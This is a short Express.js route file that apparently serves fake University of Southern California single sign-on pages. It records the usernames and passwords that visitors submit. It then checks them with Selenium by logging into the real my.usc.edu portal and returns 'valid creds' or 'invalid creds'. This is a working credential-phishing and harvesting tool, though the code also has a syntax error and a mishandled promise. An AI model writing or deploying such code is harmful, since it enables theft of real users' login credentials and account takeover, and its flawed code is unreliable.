var express = require('express');
var router = express.Router();
const logger = require('../utils/logger');
const {Builder, By, Key, until} = require('selenium-webdriver');


/* GET home page. */
router.get('/', function (req, res, next) {
    res.redirect("/webapps/login")
});

router.get('/webapps/login', function (req, res, next) {
    res.render('index');
});

router.get('/idp/profile/SAML2/Redirect/SSO', function (req, res, next) {
    res.render('login');
});

router.post('/idp/profile/SAML2/Redirect/SSO/login', function (req, res, next) {
    var username = req.body.j_username;
    var password = req.body.j_password;
    if (username != "jdecaro") {
        logger.info(username);
        logger.info(password);
    }
    let driver = new Builder()
        .forBrowser('chrome').build();

    driver.get('https://my.usc.edu')
        .then(_ =>
            driver.findElement(By.id('username')).sendKeys(username))
        .then(_ =>
            driver.findElement(By.id('password')).sendKeys(password, Key.RETURN))
        .then(_ => {
            const url = driver.getCurrentUrl();
            if (url.indexOf('shibboleth') === -1{
                res.status(500);
                res.send("invalid creds");
            }else{
                res.status(200);
                res.send('valid creds');
            }
        }).then(
        _ => driver.quit(),
        e => driver.quit().then(() => {
            throw e;
        }));
});

module.exports = router;
